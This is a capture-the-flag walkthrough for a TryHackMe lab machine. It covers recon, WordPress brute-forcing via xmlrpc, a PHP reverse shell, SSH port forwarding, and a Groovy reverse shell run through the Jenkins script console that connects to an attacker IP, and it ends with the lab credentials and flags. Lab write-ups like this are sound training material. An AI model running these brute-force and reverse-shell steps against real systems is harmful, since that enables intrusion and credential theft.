https://tryhackme.com/room/internal
# IP
```
10.10.21.13
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 10.10.21.13 -v
22/tcp    open     ssh
80/tcp    open     http

nmap -p22,80 -sS -sC -sV 10.10.21.13 -v
```
## Web
### dirb
```bash
dirb http://10.10.21.13/
# result
/blog
/phpmyadmin
```
### nikto
```bash
nikto -h 10.10.21.13
# result
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.21.13
+ Target Hostname:    10.10.21.13
+ Target Port:        80
+ Start Time:         2024-03-23 07:11:33 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ /phpmyadmin/changelog.php: Uncommon header 'x-ob_mode' found, with contents: 1.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.
+ /wordpress/wp-admin/: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ /wordpress/: Drupal Link header found with value: <http://internal.thm/blog/index.php/wp-json/>; rel="https://api.w.org/". See: https://www.drupal.org/
+ /wordpress/: A Wordpress installation was found.
+ /phpmyadmin/: phpMyAdmin directory found.
+ /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /blog/wp-login.php: Wordpress login found.
+ /wordpress/wp-login.php: Wordpress login found.
+ 8226 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2024-03-23 07:27:09 (GMT-4) (936 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

# intersting ones
/phpmyadmin
/wordpress/wp-links-opml.php -> WordPress/5.4.2
```
### /blog
`http://internal.thm/blog/index.php/2020/08/03/hello-world/` link may say that would be better to add host `internal.thm` to `/etc/hosts`. After doing it, website opens normally.
It is wordpress website.
### /phpmyadmin
login page
### Wordpress User Enum
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
Users: `http://internal.thm/blog/index.php/wp-json/wp/v2/users/`

it has one user and he is `admin`
### Brute Force
```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params>
<param><value>admin</value></param><param><value>pass</value></param></params></methodCall>" http://internal.thm/blog/xmlrpc.php
```
Simple script from gpt
```bash
#!/bin/bash
while IFS= read -r pass; do
echo $pass
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params>
<param><value>admin</value></param><param><value>$pass</value></param></params></methodCall>" http://internal.thm/blog/xmlrpc.php
done < "/usr/share/wordlists/rockyou.txt"
```
you will find that `admin:my2boys` is correct creds
# Rev Shell
https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php - PHP Reverse Shell
shell stabilization
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```
# PrivEsc to user
checking `/opt`
```bash
www-data@internal:/opt$ ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

```bash
aubreanna@internal:~$ l
jenkins.txt*  snap/  user.txt*
aubreanna@internal:~$ cat user.txt 
THM{int3rna1_fl4g_1}
```

```
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```
Forward traffic to local
```
ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.21.13 -N
```
# PrivEsc to root
Capture request in burp and brute force Jenkins. Creds: `admin:spongebob`

`http://localhost:8080/script` for rce
```java
Thread.start {
String host="10.8.97.245";
int port=1234;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

```
nc -lvnp 1234
```

```
jenkins@jenkins:/opt$ cd ~    
cd ~
jenkins@jenkins:~$ cd /opt
cd /opt
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

```
root@internal:~# cat root.txt 
THM{d0ck3r_d3str0y3r}
```
